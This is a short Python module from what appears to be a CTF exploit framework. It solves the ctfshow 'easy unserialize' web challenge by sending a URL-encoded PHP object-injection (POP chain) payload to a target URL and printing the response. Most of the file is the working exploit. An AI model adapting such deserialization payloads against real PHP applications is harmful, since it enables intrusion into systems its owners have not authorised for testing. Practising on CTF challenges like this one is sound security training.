 # -*- coding: utf-8 -*-
def info():
	info={
"questname":"easy unserialize",
"platform":"ctfshow",
"contest" : "jwb(juan wang bei)",
"description":"ctfshow jwb web easy unserialize.",
"requirements":"python requests",
"module options":[
	{"name":"url","required":True,"description":"full url."},
	]
}
	return(info)

def exploit(options):
	url=options['url']
	import requests
	if url[:7]!="http://" :
		url='http://'+url
	payload="?ctfshow=O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D"
	r=requests.get(url+payload)
	print(r.content.decode())
	return("套神做完了，并觉得过于简单")


def make_wp():
	wp="""
自己看官方wp
"""
	return(wp)
	